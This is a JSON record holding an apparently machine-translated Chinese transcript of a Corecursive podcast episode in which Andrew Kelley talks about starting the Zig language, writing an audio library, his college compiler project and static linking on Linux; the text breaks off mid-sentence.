[{"category": "", "categoryclass": "", "imagename": "d97286a0b29fd40342caab3a840e39b9.png", "infoid": 1071348, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4eca\u5929\u7684\u8282\u76ee\uff1a\u5982\u4f55\u8f9e\u6389\u5de5\u4f5c\u5e76\u5168\u804c\u4ece\u4e8b\u5f00\u6e90\u5de5\u4f5c\u3002\u8fd9\u4e2a\u6545\u4e8b\u8bf4\u660e\u4e86\u4e00\u5207\u2014\u2014\u5e73\u8861\u4e1a\u4f59\u9879\u76ee\u548c\u5168\u804c\u5de5\u4f5c\uff0c\u5efa\u7acb\u8db3\u591f\u7684\u652f\u6301\u6765\u79bb\u5f00\u4f60\u7684\u5de5\u4f5c\uff0c\u5e76\u5411\u4f60\u7684\u5bb6\u4eba\u548c\u670b\u53cb\u89e3\u91ca\u8f9e\u804c\u3002\u8fd8\u6709\uff1a\u5982\u679c\u4f60\u7684\u9879\u76ee\u6210\u529f\u4e86\uff0c\u7136\u540e\u6709\u4eba\u5206\u53c9\u5e76\u56f4\u7ed5\u5b83\u5efa\u7acb\u5546\u4e1a\u4e1a\u52a1\uff0c\u4f60\u4f1a\u600e\u4e48\u505a\uff1f\u60a8\u5982\u4f55\u5904\u7406\u9ed1\u5ba2\u65b0\u95fb\u53cd\u9988\uff1f\u6211\u4eec\u5982\u4f55\u6539\u8fdb C \u7f16\u7a0b\u8bed\u8a00\uff1f\u5728\u6b64\u5904\u8ba2\u9605 \u6ce8\u610f\uff1a\u6b64\u64ad\u5ba2\u65e8\u5728\u4f9b\u4eba\u4eec\u8046\u542c\u3002\u5982\u679c\u53ef\u4ee5\uff0c\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u60a8\u6536\u542c\u97f3\u9891\uff0c\u5176\u4e2d\u5305\u62ec\u9875\u9762\u4e0a\u6ca1\u6709\u7684\u91cd\u70b9 Andrew\uff1a\u8ba9\u6211\u6f84\u6e05\u4e00\u4e0b\u3002\u5546\u4e1a\u5206\u53c9 Zig \u5f88\u597d\u3002\u5b83\u662f MIT \u8bb8\u53ef\u7684\uff0c\u5c31\u50cf\u53bb\u4e00\u6837\u3002\u4f46\u662f\u4ed6\u4eec\u5bf9 Fork \u6240\u505a\u7684\u4e8b\u60c5\u975e\u5e38\u68d8\u624b\uff0c\u5bf9\u5427\uff1f\u56e0\u6b64\uff0c\u4ed6\u4eec\u5b9e\u9645\u4e0a\u5220\u9664\u4e86\u8bb8\u53ef\u8bc1\u6587\u4ef6\uff0c\u5c06\u4ed6\u4eec\u81ea\u5df1\u7684\u8bb8\u53ef\u8bc1\u653e\u5165\u5176\u4e2d\uff0c\u770b\u8d77\u6765\u60a8\u5fc5\u987b\u4e3a\u8be5\u8f6f\u4ef6\u4ed8\u8d39\u3002\u6240\u4ee5\uff0c\u4ed6\u4eec\u6b3a\u9a97\u4e86\u4eba\u4eec\u3002\u8fd9\u5c31\u662f\u4ed6\u4eec\u6240\u505a\u7684\u95ee\u9898\u3002\u4e9a\u5f53\uff1a\u4f60\u597d\uff0c\u6b22\u8fce\u6765\u5230 Corecursive\u3002\u6211\u662f\u4e9a\u5f53\u00b7\u6208\u767b\u00b7\u8d1d\u5c14\u3002\u6bcf\u4e00\u96c6\u90fd\u6709\u4eba\u5206\u4eab\u4e00\u4e2a\u6b63\u5728\u6784\u5efa\u7684\u8f6f\u4ef6\u7684\u6545\u4e8b\u3002\u4eca\u5929\u7684\u8282\u76ee\uff0c\u5982\u4f55\u8f9e\u6389\u5de5\u4f5c\u5e76\u5168\u804c\u4ece\u4e8b\u5f00\u6e90\u5de5\u4f5c\u3002\u8fd9\u4e2a\u6545\u4e8b\u8bf4\u660e\u4e86\u4e00\u5207\uff0c\u5e73\u8861\u5f00\u6e90\u5de5\u4f5c\u548c\u5168\u804c\u5de5\u4f5c\uff0c\u5efa\u7acb\u8db3\u591f\u7684\u652f\u6301\u8005\u548c\u8db3\u591f\u7684\u50a8\u84c4\u6765\u79bb\u5f00\u4f60\u7684\u5de5\u4f5c\u3002\u5bf9\u6211\u6765\u8bf4\u6700\u56f0\u96be\u7684\u90e8\u5206\u662f\u5411\u4f60\u7684\u53e6\u4e00\u534a\u4ee5\u53ca\u4f60\u7684\u5bb6\u4eba\u548c\u670b\u53cb\u89e3\u91ca\u79bb\u5f00\u4f60\u7684\u5de5\u4f5c\u3002\u7136\u540e\uff0c\u5982\u679c\u4f60\u7684\u9879\u76ee\u6210\u529f\u4e86\uff0c\u7136\u540e\u6709\u4eba\u5206\u53c9\u5e76\u56f4\u7ed5\u5b83\u5efa\u7acb\u5546\u4e1a\u4e1a\u52a1\uff0c\u4f60\u4f1a\u600e\u4e48\u505a\uff1f\u8fd8\u6709\u5f88\u591a\u5904\u7406\u9ed1\u5ba2\u65b0\u95fb\u53cd\u9988\u3001\u5982\u4f55\u6539\u8fdb C \u7f16\u7a0b\u8bed\u8a00\u4ee5\u53ca\u5982\u4f55\u5728\u4e0d\u663e\u5f97\u50b2\u6162\u7684\u60c5\u51b5\u4e0b\u96c4\u5fc3\u52c3\u52c3\u3002\u6211\u7684\u5ba2\u4eba\u5c31\u662f\u8fd9\u4e2a\u4eba\u3002\n\u5b89\u5fb7\u9c81\uff1a\u6211\u53eb\u5b89\u5fb7\u9c81\u00b7\u51ef\u5229\u3002\u6211\u662f Zig \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u9996\u5e2d\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u548c\u603b\u88c1\u3002 Adam\uff1aZig \u662f\u4e00\u79cd\u7f16\u7a0b\u8bed\u8a00\uff0c\u6211\u4eec\u5c06\u63a2\u8ba8\u4e3a\u4ec0\u4e48\u9700\u8981\u5b83\uff0c\u4f46 Andrew \u5f00\u59cb\u4f7f\u7528 Zig \u662f\u56e0\u4e3a\u53e6\u4e00\u4e2a\u526f\u9879\u76ee\u3002\u5b89\u5fb7\u9c81\uff1a\u6211\u5f00\u59cb\u505a\u4e00\u4e2a\u97f3\u4e50\u5de5\u4f5c\u5ba4\u9879\u76ee\uff0c\u5728\u8fd9\u4e2a\u97f3\u4e50\u5de5\u4f5c\u5ba4\u9879\u76ee\u4e2d\uff0c\u4f60\u6709\u6bd4\u5176\u4ed6\u7f16\u7a0b\u9879\u76ee\u66f4\u56f0\u96be\u7684\u8981\u6c42\u3002\u56e0\u6b64\uff0c\u4f8b\u5982\uff0c\u5982\u679c\u6709\u4eba\u8981\u73b0\u573a\u4f7f\u7528\u60a8\u7684\u97f3\u4e50\u5de5\u4f5c\u5ba4\u8f6f\u4ef6\u8fdb\u884c\u73b0\u573a\u8868\u6f14\uff0c\u5219\u60a8\u6709\u4e00\u4e2a\u70ed\u5faa\u73af\uff0c\u60a8\u7edd\u5bf9\u4e0d\u80fd\u8df3\u8fc7\u97f3\u9891\uff0c\u5426\u5219\u4ed6\u4eec\u7684\u6574\u4e2a\u8868\u6f14\u53ef\u80fd\u4f1a\u53d7\u5230\u5f71\u54cd\u3002\u6240\u4ee5\uff0c\u4f60\u53ea\u662f\u6709\u8fd9\u4e9b\u65b0\u7684\u7ea6\u675f\uff0c\u4f60\u771f\u7684\u9700\u8981\u63a7\u5236\u5b83\u7684\u5de5\u4f5c\u65b9\u5f0f\u3002\u540c\u6837\uff0c\u5982\u679c\u60a8\u60f3\u652f\u6301\u4e0e\u6b64\u76f8\u5173\u7684\u6240\u6709\u786c\u4ef6\uff0c\u5f88\u591a\u65f6\u5019\u60a8\u5c06\u65e0\u6cd5\u4f9d\u9760\u5176\u4ed6\u4eba\u7684\u7b2c\u4e09\u65b9\u5e93\u6765\u4e3a\u60a8\u505a\u8fd9\u4ef6\u4e8b\uff0c\u60a8\u5c06\u4e0d\u5f97\u4e0d\u8fdb\u5165 OC\u3001C++ \u6216\u5176\u4ed6\u4f4e\u7ea7\u8bed\u8a00\uff0c\u8fd9\u4e9b\u8bed\u8a00\u53ef\u4ee5\u4e3a\u60a8\u63d0\u4f9b\u6240\u9700\u7684\u63a7\u5236\u6743\uff0c\u6211\u6ce8\u610f\u5230\u7684\u53e6\u4e00\u4ef6\u4e8b\u662f\uff0c\u5f53\u6211\u5c1d\u8bd5\u4f7f\u7528\u5176\u4ed6\u4eba\u7684\u5e93\u65f6\uff0c\u5982\u679c\u9047\u5230\u95ee\u9898\uff0c\u6211\u5c06\u65e0\u6cd5\u4fee\u7406\u5b83\u3002\u592a\u6162\u4e86\u3002\u6211\u6b63\u5728\u52aa\u529b\u5728\u8fd9\u4e2a\u5927\u9879\u76ee\u4e0a\u53d6\u5f97\u8fdb\u5c55\uff0c\u5e76\u4e14\u6211\u5b66\u5230\u4e86\u5728\u8fd9\u91cc\u53d1\u660e\u4e1c\u897f\u7684\u4ef7\u503c\uff0c\u5bf9\u5427\uff1f\u4eba\u4eec\u603b\u662f\u544a\u8bc9\u4f60\uff0c\u201c\u4e0d\u8981\u53d1\u660e\u3002\u201d\u4e0d\u8981 NIH \u7efc\u5408\u75c7\uff0c\u4f46\u6211\u5b66\u5230\u4e86\u5b9e\u9645\u4e0a\u7684\u4ef7\u503c\uff0c\u662f\u7684\uff0c\u6709\u65f6\u8fd9\u6837\u505a\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4f60\u771f\u7684\u60f3\u8981\u90a3\u4e48\u591a\u7684\u6743\u529b\u548c\u63a7\u5236\uff0c\u4f60\u5c31\u5fc5\u987b\u53bb\u505a\u3002\u6240\u4ee5\uff0c\u90a3\u662f\u6211\u5f00\u59cb\u771f\u6b63\u4ece\u5934\u5f00\u59cb\u4f7f\u7528 C \u6216 C++ \u8fdb\u884c\u7f16\u7a0b\u7684\u65f6\u5019\u3002\u5b89\u5fb7\u9c81\uff1a\u6211\u8ba4\u4e3a\u81ea\u7136\u7684\u7b2c\u4e00\u4e2a\u51b2\u52a8\u662f\uff0c\u5982\u679c\u5176\u4ed6\u4eba\u89e3\u51b3\u4e86\u95ee\u9898\uff0c\u5c31\u53bb\u4f7f\u7528\u4ed6\u4eec\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5bf9\u5417\uff1f\u5df2\u7ecf\u5b8c\u6210\u4e86\u3002\u4f60\u5199\u4e86\u80f6\u6c34\u4ee3\u7801\uff0c\u7136\u540e\u4f60\u5c31\u79bb\u5f00\u4e86\u3002\u5728\u5f88\u591a\u65b9\u9762\u8fd9\u5f88\u806a\u660e\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u6709\u8fd9\u4e48\u591a\u65f6\u95f4\uff0c\u6211\u4eec\u53ea\u6709\u8fd9\u4e48\u591a\u80fd\u529b\u6765\u5206\u6790\u95ee\u9898\u7a7a\u95f4\u3002\u800c\u53e6\u4e00\u4e2a\u4eba\u5df2\u7ecf\u5b8c\u6210\u4e86\u90a3\u90e8\u5206\u3002\u90a3\u4e48\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u4f8b\u5b50\u3002\u97f3\u9891\u5e93\u5c31\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002\u6240\u4ee5\uff0c\u6211\u5c1d\u8bd5\u4f7f\u7528\u7aef\u53e3\u97f3\u9891\u3002\u6211\u60f3\u6211\u5c1d\u8bd5\u8fc7\u4f7f\u7528 SDL\u3002\u8fd9\u4e9b\u9879\u76ee\u5927\u591a\u6709\u6548\uff0c\u4f46\u95ee\u9898\u662f\u5b83\u4eec\u89e3\u51b3\u4e86 90% \u7684\u95ee\u9898\uff0c\u5982\u679c\u4f60\u60f3\u7f29\u5c0f\u6700\u540e 10% \u7684\u5dee\u8ddd\uff0c\u4f60\u5fc5\u987b\u91cd\u65b0\u5f00\u59cb\u3002\u6240\u4ee5\uff0c\u6211\u6700\u7ec8\u7f16\u5199\u4e86\u81ea\u5df1\u7684\u8de8\u5e73\u53f0\u97f3\u9891\u62bd\u8c61\uff0c\u79f0\u4e3a libsound.io\uff0c\u8fd9\u8ba9\u6211\u53ef\u4ee5\u505a\u5176\u4ed6\u5e93\u4e0d\u5141\u8bb8\u6211\u505a\u7684\u4e8b\u60c5\u3002\u56e0\u6b64\uff0c\u4f8b\u5982\uff0c\u6211\u80fd\u591f\u53ea\u663e\u793a\u8f93\u5165\u8bbe\u5907\u5217\u8868\u5e76\u8ba9\u5b83\u81ea\u52a8\u5237\u65b0\u3002\u5982\u679c\u4f60\u62d4\u6389\u9ea6\u514b\u98ce\uff0c\u5b83\u5c31\u4f1a\u6d88\u5931\uff0c\u5982\u679c\u4f60\u63d2\u5165\u9ea6\u514b\u98ce\uff0c\u5b83\u5c31\u4f1a\u51fa\u73b0\u3002\n\u770b\u8d77\u6765\u5f88\u7b80\u5355\uff0c\u5bf9\u4e8e\u7528\u6237\u4f53\u9a8c\u6765\u8bf4\u4f3c\u4e4e\u662f\u4e00\u4ef6\u5f88\u5408\u7406\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u5176\u4ed6\u8fd9\u4e9b\u5e93\u5c31\u662f\u6ca1\u6709\u8fd9\u79cd\u80fd\u529b\u3002\u8001\u5b9e\u8bf4\uff0c\u6211\u53ef\u80fd\u9700\u8981\u6570\u5e74\u65f6\u95f4\u624d\u80fd\u5c06\u529f\u80fd\u5f15\u5165\u8fd9\u4e9b\u5e93\uff0c\u7136\u540e\u6709\u8db3\u591f\u7684\u65f6\u95f4\u8ba9\u8fd9\u4e9b\u5e93\u5c06\u66f4\u65b0\u6dfb\u52a0\u5230\u6253\u5305\u5e93\u7684\u5404\u79cd\u5f00\u6e90\u53d1\u884c\u7248\u4e2d\u3002\u56e0\u4e3a\u5982\u679c\u60a8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93\uff0c\u4eba\u4eec\u5e0c\u671b\u4f7f\u7528\u9884\u5148\u6253\u5305\u7684\u7248\u672c\u3002\u6240\u4ee5\uff0c\u4f60\u751a\u81f3\u5728\u7b49\u5f85\u4ed6\u4eec\u7684\u53d1\u5e03\u5468\u671f\u3002\u7136\u540e\uff0c\u60a8\u6b63\u5728\u7b49\u5f85\u4e0b\u6e38\u7ef4\u62a4\u8005\u83b7\u53d6\u5b83\uff0c\u4f46\u662f\u5982\u679c\u60a8\u5c06\u5176\u653e\u5165\u81ea\u5df1\u7684\u4ee3\u7801\u5e93\u4e2d\uff0c\u90a3\u4e48\u60a8\u53ea\u9700\u5728\u60f3\u8981\u53d1\u5e03\u5b83\u65f6\u53d1\u5e03\u5b83\uff0c\u5bf9\u5417\uff1f\u5e76\u4e14\u8fd9\u4e9b\u8bed\u8a00\u6709\u5f88\u591a\u95ee\u9898\u963b\u788d\u4e86\u8fdb\u5c55\uff0c\u9519\u8bef\u9700\u8981\u5f88\u957f\u65f6\u95f4\u624d\u80fd\u627e\u5230\u548c\u4fee\u590d\uff0c\u8fdb\u5c55\u6bd4\u9884\u671f\u7684\u8981\u6162\u3002\u6240\u4ee5\uff0c\u90a3\u662f\u6c41\u6db2\u5f00\u59cb\u6d41\u52a8\u7684\u65f6\u5019\u3002\u6211\u60f3\uff0c\u201c\u6211\u60f3\u6211\u53ef\u4ee5\u505a\u5f97\u6bd4\u8fd9\u66f4\u597d\u3002\u201d\u6211\u60f3\u6211\u770b\u5230\u4e86\u8fd9\u4e9b\u8bed\u8a00\u5e26\u6765\u4e86\u4ec0\u4e48\uff0c\u6211\u60f3\u6211\u53ef\u4ee5\u5c06\u5b83\u4eec\u63d0\u5347\u5230\u4e00\u4e2a\u65b0\u7684\u6c34\u5e73\u3002\u4e9a\u5f53\uff1a\u4f60\u6709\u6ca1\u6709\u5bf9\u6297\u8fd9\u79cd\u51b2\u52a8\uff1f\u60a8\u662f\u5426\u7acb\u5373\u5728\u6784\u5efa\u8bed\u8a00\u6216\u90a3\u91cc\u53d1\u751f\u4e86\u4ec0\u4e48\u4e8b\u60c5\u4e0a\u504f\u79bb\u4e86\u65b9\u5411\uff1f\u5b89\u5fb7\u9c81\uff1a\u6211\u6709\u3002\u6211\u786e\u5b9e\u4e0e\u51b2\u52a8\u4f5c\u6597\u4e89\u3002\u6211\u5728\u97f3\u4e50\u64ad\u653e\u5668\u9879\u76ee\u4e0a\u575a\u6301\u4e86\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u3002\u7136\u540e\uff0c\u8bf4\u5b9e\u8bdd\uff0c\u6211\u521a\u521a\u7ecf\u5386\u4e86\u4e00\u6bb5\u8270\u96be\u7684\u751f\u6d3b\u7ecf\u5386\u3002\u5f53\u65f6\u662f\u5206\u624b\uff0c\u5c31\u50cf\u4e00\u79cd\u5e94\u5bf9\u673a\u5236\uff0c\u6211\u8ba9\u81ea\u5df1\u8bf4\uff0c\u201c\u563f\uff0c\u6211\u77e5\u9053\u4f60\u4e00\u76f4\u5728\u52aa\u529b\u4fdd\u6301\u81ea\u5f8b\u5e76\u575a\u6301\u540c\u4e00\u4e2a\u9879\u76ee\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\uff0c\u4f46\u53bb\u73a9\u70b9\u4e50\u5427\uff0c\u5f00\u59cb\u4e00\u4e2a\u65b0\u9879\u76ee\uff0c\u5f00\u59cb\u4e00\u79cd\u7f16\u7a0b\u8bed\u8a00\u3002\u5bf9\u4f60\u4f1a\u6709\u597d\u5904\u3002\u201d\u7136\u540e\uff0c\u5b83\u6c38\u8fdc\u4e0d\u4f1a\u5207\u6362\u56de\u6765\u3002\u4e9a\u5f53\uff1a\u6240\u4ee5\uff0c\u4f60\u662f\u4e0d\u662f\u597d\u50cf\u6211\u7684\u6574\u4e2a\u5927\u8111\u90fd\u88ab\u8fd9\u6b21\u5206\u624b\u6240\u5360\u636e\uff0c\u4f46\u6211\u60f3\u5982\u679c\u6211\u5f00\u59cb\u8fd9\u4e2a\u65b0\u9879\u76ee\uff0c\u81f3\u5c11\u53ef\u4ee5\u6682\u65f6\u628a\u5b83\u4ece\u6211\u7684\u5927\u8111\u4e2d\u6324\u51fa\u6765\uff1f\u5b89\u5fb7\u9c81\uff1a\u55ef\u55ef\uff08\u80af\u5b9a\uff09\u3002\u6211\u7684\u610f\u601d\u662f\u6211\u8ba4\u4e3a\u53ea\u662f\u81ea\u7136\u7684\u60c5\u611f\u8fdb\u6b65\u4f1a\u987a\u5176\u81ea\u7136\uff0c\u4f46\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u6b63\u5728\u73a9\u4e00\u4e2a\u5206\u6563\u6ce8\u610f\u529b\u7684\u73a9\u5177\u9879\u76ee\u3002\u4e9a\u5f53\uff1a\u662f\u7684\u3002\u6211\u7684\u610f\u601d\u662f\u5b83\u80af\u5b9a\u6bd4\u73a9\u9a6c\u91cc\u5965\u8d5b\u8f66\u7684\u6548\u7387\u66f4\u9ad8\uff0c\u6211\u4e0d\u77e5\u9053\u2014\u2014\n\u4e9a\u5f53\uff1a\u2026\u2026\u4e00\u5929\u516b\u5c0f\u65f6\u4ec0\u4e48\u7684\u3002\u6211\u559c\u6b22\u9a6c\u91cc\u5965\u8d5b\u8f66\u3002\u6211\u4e0d\u77e5\u9053\u3002\u5b89\u5fb7\u9c81\uff1a\u6211\u7b2c\u4e00\u6b21\u4f7f\u7528\u7f16\u7a0b\u8bed\u8a00\u65f6\uff0c\u6211\u4e00\u76f4\u60f3\u77e5\u9053\u7f16\u5199\u4e00\u4e2a\u8bed\u8a00\u4f1a\u662f\u4ec0\u4e48\u611f\u89c9\uff1f\u6bcf\u5f53\u6211\u542c\u97f3\u4e50\u65f6\uff0c\u6211\u603b\u662f\u60f3\u77e5\u9053\u5c1d\u8bd5\u5236\u4f5c\u8fd9\u6837\u4e00\u9996\u6b4c\u66f2\u4f1a\u662f\u4ec0\u4e48\u611f\u89c9\uff1f\u6211\u4e00\u76f4\u5f88\u559c\u6b22\u901a\u8fc7\u53ea\u662f\u60f3\u77e5\u9053\u8fc7\u7a0b\u7684\u53e6\u4e00\u9762\u662f\u4ec0\u4e48\u6837\u5b50\u6765\u6d88\u8d39\u4e1c\u897f\u3002 Adam\uff1a\u5f53\u6211\u5728\u5927\u5b66\u65f6\uff0c\u6211\u6709\u4e00\u5802\u8bfe\uff0c\u6211\u4eec\u6784\u5efa\u4e86\u4e00\u4e2a\u7f16\u8bd1\u5668\uff0c\u5c31\u50cf\u4e00\u4e2a\u73a9\u5177\u7f16\u8bd1\u5668\u3002\u8fd9\u975e\u5e38\u6709\u8da3\u3002 Andrew \u4e5f\u6709\u7c7b\u4f3c\u7684\u7ecf\u5386\uff0c\u4ed6\u7ee7\u7eed\u73a9\u5f04 CoffeeScript \u7684\u53c9\u5b50\u3002\u6211\u53d1\u73b0\u73a9\u7f16\u7a0b\u8bed\u8a00\u5f88\u6709\u8da3\uff0c\u4f46\u662f Andrew\uff0c\u4ed6\u4ece\u4e2d\u5f97\u5230\u4e86\u4e00\u4e9b\u4e0d\u540c\u7684\u4e1c\u897f\u3002\u5b89\u5fb7\u9c81\uff1a\u4f60\u77e5\u9053\u90a3\u662f\u4ec0\u4e48\u5417\uff1f\u5b9e\u9645\u4e0a\u51e0\u5e74\u524d\u6211\u8dd1\u4e86\u6211\u7684\u7b2c\u4e00\u6b21\u9a6c\u62c9\u677e\uff0c\u4f46\u6211\u89c9\u5f97\u6211\u6ca1\u6709\u3002\u56e0\u4e3a\u6211\u8d70\u4e86\u6700\u540e\u56db\u82f1\u91cc\uff0c\u72e0\u72e0\u5730\u649e\u5230\u4e86\u90a3\u5835\u5899\u3002\u6211\u60f3\u5927\u591a\u6570\u4eba\u90fd\u4f1a\u8fd9\u6837\u505a\uff0c\u56e0\u4e3a\u6211\u4ecd\u7136\u5904\u4e8e\u6211\u8fd9\u4e2a\u5e74\u9f84\u6bb5\u7684\u524d 50% \u4e4b\u5217\u3002\u6240\u4ee5\uff0c\u6211\u60f3\u5927\u591a\u6570\u4eba\u90fd\u662f\u5728\u9a6c\u62c9\u677e\u6bd4\u8d5b\u7ed3\u675f\u65f6\u8d70\u7684\uff0c\u4f46\u5728\u6211\u7684\u8111\u6d77\u91cc\uff0c\u5c31\u50cf\u4f60\u6ca1\u6709\u505a\u5230\u4e00\u6837\u3002\u4f60\u8d70\u4e86\u4e00\u90e8\u5206\uff0c\u5bf9\u5427\uff1f\u6240\u4ee5\uff0c\u6211\u4e00\u76f4\u5bf9\u6211\u5236\u4f5c\u7684\u7f16\u8bd1\u5668\u6709\u8fd9\u79cd\u611f\u89c9\uff0c\u56e0\u4e3a\u5982\u679c\u5b83\u50cf\u4e00\u4e2a CoffeeScript\uff0c\u4f60\u5b9e\u9645\u4e0a\u53ea\u662f\u5728\u8f93\u51fa JavaScript\u3002\u7136\u540e\uff0c\u5bf9\u4e8e\u5927\u5b66\u91cc\u7684\u90a3\u4e2a\uff0c\u6559\u6388\u8ba9\u6211\u4eec\u505a C \u4f5c\u4e3a\u8f93\u51fa\u3002\u6240\u4ee5\uff0c\u6211\u603b\u89c9\u5f97\u6211\u8d70\u4e86\u6700\u540e\u4e00\u90e8\u5206\u3002\u6211\u4e00\u76f4\u60f3\u8bf4\uff0c\u201c\u4e0d\u3002\u6211\u60f3\u8ba9\u5b83\u771f\u6b63\u5236\u4f5c\u673a\u5668\u4ee3\u7801\u5e76\u8ba9\u5b83\u5b8c\u6210\u6574\u4e2a\u4e8b\u60c5\u3002\u6211\u4e0d\u60f3\u5728\u67d0\u4e9b\u5c42\u9762\u4e0a\u4f5c\u5f0a\u3002\u201d\u6211\u4e5f\u4e0d\u60f3\u50cf\u4eba\u4eec\u6240\u505a\u7684\u5de5\u4f5c\u90a3\u6837\u8d2c\u503c\u3002\u8fd9\u5c31\u662f\u5b83\u4ecd\u7136\u662f\u4e00\u4e2a\u7f16\u8bd1\u5668\u3002\u5982\u679c\u60a8\u4ece\u4e00\u79cd\u8f93\u5165\u8bed\u8a00\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u8f93\u5165\u8bed\u8a00\uff0c\u90a3\u5c31\u662f\u7f16\u8bd1\u5668\u3002\u8fd9\u53ea\u662f\u6211\u4e2a\u4eba\u7684\u4e3b\u89c2\u4f53\u9a8c\uff0c\u6211\u89c9\u5f97\u6211\u9519\u8fc7\u4e86\u4e00\u4e9b\u6211\u6ca1\u6709\u5b8c\u6210\u7684\u6709\u8da3\u90e8\u5206\u3002 Adam\uff1aAndrew \u751a\u81f3\u5728\u5f00\u59cb\u4f7f\u7528 C \u8bed\u8a00\u4e4b\u524d\u5c31\u660e\u767d\u4e86\uff0c\u8fd9\u5f88\u91cd\u8981\u3002 C \u662f\u4e00\u79cd\u5c0f\u8bed\u8a00\uff0c\u5b83\u65e0\u5904\u4e0d\u5728\u3002\u6839\u636e Stack Overflow \u8c03\u67e5\uff0c20% \u7684\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u4f7f\u7528 C\u3002\u6709\u4e9b\u6761\u4ef6\u53ef\u80fd\u9002\u7528\u4e8e\u90a3\u91cc\u3002\n\u6211\u4e0d\u77e5\u9053 Stack Overflow \u8c03\u67e5\u662f\u5426\u5177\u6709\u4ee3\u8868\u6027\uff0c\u4f46\u4ed6\u4eec\u6709\u5f88\u591a\u5f00\u53d1\u4eba\u5458\u5728\u4f7f\u7528\u5b83\uff0c\u5176\u4e2d 20% \u7684\u4eba\u8bf4\u4ed6\u4eec\u6b63\u5728\u7f16\u5199 C\u3002\u8fd9\u662f\u4e94\u5206\u4e4b\u4e00\u7684\u5f00\u53d1\u4eba\u5458\u3002\u8fd9\u6bd4\u4f7f\u7528 Ruby\u3001Swift \u548c Rust \u7684\u4eba\u6570\u52a0\u8d77\u6765\u8fd8\u8981\u591a\u3002\u6240\u4ee5\uff0c\u65e0\u8bba\u5982\u4f55\uff0c\u5b89\u5fb7\u9c81\u5206\u624b\u4e86\uff0c\u4ed6\u5141\u8bb8\u81ea\u5df1\u5f00\u59cb\u5b66\u4e60\u4ed6\u7684\u8bed\u8a00\u3002\u4ed6\u7684\u60f3\u6cd5\u4e0d\u662f\u4ece\u7b2c\u4e00\u539f\u5219\u5f00\u59cb\u521b\u5efa\u4e00\u79cd\u65b0\u8bed\u8a00\uff0c\u800c\u662f\u5bfb\u627e\u53ef\u4ee5\u89e3\u51b3\u7684\u5177\u4f53\u95ee\u9898\u3002\u5b89\u5fb7\u9c81\uff1a\u5730\u6bef\u4e0b\u9762\u6709\u6c61\u57a2\u5417\uff1f\u4e5f\u8bb8\u6211\u4eec\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u65b9\u5f0f\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u8bb8\u591a\u8f6f\u4ef6\u90fd\u662f\u5efa\u7acb\u5728\u524d\u51e0\u4ee3\u4eba\u4ea4\u7ed9\u6211\u4eec\u7684\u62bd\u8c61\u524d\u63d0\u4e0a\u7684\u3002\u8ba9\u6211\u4eec\u628a\u8fd9\u4e9b\u5265\u5f00\u4e00\u70b9\uff0c\u770b\u4e00\u773c\u7136\u540e\u8bf4\uff1a\u201c\u4e5f\u8bb8\u6211\u4eec\u73b0\u5728\u53ef\u80fd\u60f3\u8981\u505a\u51fa\u4e00\u4e9b\u4e0d\u540c\u7684\u51b3\u5b9a\uff0c\u56e0\u4e3a 40 \u5e74\u540e\u4e86\u3002\u201d\u5b89\u5fb7\u9c81\uff1a\u4e00\u4e2a\u4f8b\u5b50\u662f\u9759\u6001\u94fe\u63a5\u3002\u5982\u679c\u60a8\u5c1d\u8bd5\u5728 Linux \u4e0a\u53d1\u5e03\u5e94\u7528\u7a0b\u5e8f\uff0c\u4eba\u4eec\u4f1a\u9047\u5230\u4e00\u4e2a\u5e38\u89c1\u95ee\u9898\uff0c\u5373\u5b83\u53ea\u80fd\u5728 Linux \u7684\u4e00\u4e2a\u53d1\u884c\u7248\u4e0a\u8fd0\u884c\u3002\u56e0\u6b64\uff0c\u4f8b\u5982\uff0c\u6709\u4eba\u53ef\u80fd\u4f1a\u5728\u60a8\u4e0b\u8f7d\u7684\u7f51\u7ad9\u4e0a\u63d0\u4f9b\u4ed6\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f46\u53ea\u80fd\u5728 Ubuntu \u6216\u4e0e Ubuntu \u8db3\u591f\u63a5\u8fd1\u7684\u4e1c\u897f\u4e0a\u8fd0\u884c\u3002\u4e9a\u5f53\uff1a\u6211\u771f\u7684\u53ea\u662f\u9047\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002\u6211\u8bd5\u56fe\u5b89\u88c5\u4e00\u4e2a Python \u5e93 Matplotlib\u3002\u5728 Mac OS \u4e0a\uff0c\u8fd9\u975e\u5e38\u5bb9\u6613\uff0c\u4f46\u662f\u8981\u5c06\u5176\u5bfc\u5165 Alpine Linux\uff0c\u6211\u5fc5\u987b\u5b89\u88c5\u6240\u6709\u8fd9\u4e9b\u4f9d\u8d56\u9879\u3002 Andrew\uff1a\u539f\u56e0\u662f\u4ed6\u4eec\u52a8\u6001\u94fe\u63a5\u4e86\u4ed6\u4eec\u4f9d\u8d56\u7684\u6240\u6709\u5e93\u3002\u4ed6\u4eec\u53ea\u662f\u5e0c\u671b\u60a8\u4f7f\u7528\u7cfb\u7edf\u5305\u7ba1\u7406\u5668\u5b89\u88c5\u8fd9\u4e9b\u5e93\u3002\u6211\u9009\u62e9\u5236\u4f5c Zig \u4ee5\u4fbf\u5728 Linux \u4e0a\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u662f\uff0c\u5f53\u6211\u4eec\u4e3a Linux \u63d0\u4f9b\u9884\u6784\u5efa Zig \u7684\u4e0b\u8f7d\u65f6\uff0c\u60a8\u6839\u672c\u4e0d\u94fe\u63a5 